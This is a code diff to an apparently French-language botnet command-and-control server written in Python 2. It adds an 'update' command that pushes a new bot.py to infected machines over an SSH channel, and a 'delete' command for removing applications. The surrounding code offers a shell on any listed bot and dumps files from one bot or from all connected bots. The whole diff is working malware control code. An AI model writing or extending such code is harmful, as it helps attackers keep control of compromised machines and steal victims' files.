@@ -43,6 +43,17 @@ class Myserver():
         for key in dict.keys():
             print str(key)+"    |"
 
+    def update(self):
+        ChannelSSH.sendToChannel('update', self.chan)
+        recv = ChannelSSH.receiveFromChannel(self.chan)
+        if not 'OK!' in recv:
+            print recv
+            return
+
+        with open('bot.py', 'r') as f:
+            text = f.read()
+        ChannelSSH.sendToChannel(text, self.chan)
+
     def  client_connection(self):
         self.sock.setblocking(0)
         while True:
@@ -85,6 +96,8 @@ class Myserver():
                         print "switch : pour avoir un shell vers un autre bot de la liste, il faut entrer une ip parmi la liste des bots disponibles\n"
                         print "dump : Faire un dump de fichiers du bot courant.\n"
                         print "dumpall : Faire un dump de fichiers de tous les bots connectés.\n"
+                        print "delete Nom_application : Supprimer une application à partir de son nom.\n"
+                        print "update : Mis-à jou du bot à partir du nouveau.\n"
                         print "deconnect : pour déconnecter le bot courant\n\n"
                     elif command == 'switch':
                         IP = raw_input("Enter l'IP d'un bot parmi la liste : ")
@@ -94,6 +107,8 @@ class Myserver():
                             print "!! cette ip ne fait pas partie de la liste des bots disponibles.\n"
                     elif command == 'list':
                         self.lister_bots(self.bots)
+                    elif command == 'update':
+                        self.update()
                     elif command == 'dumpall':
                         print '[*] Starting Dumping files from all bots\n'
                         for bot  in self.bots.values():
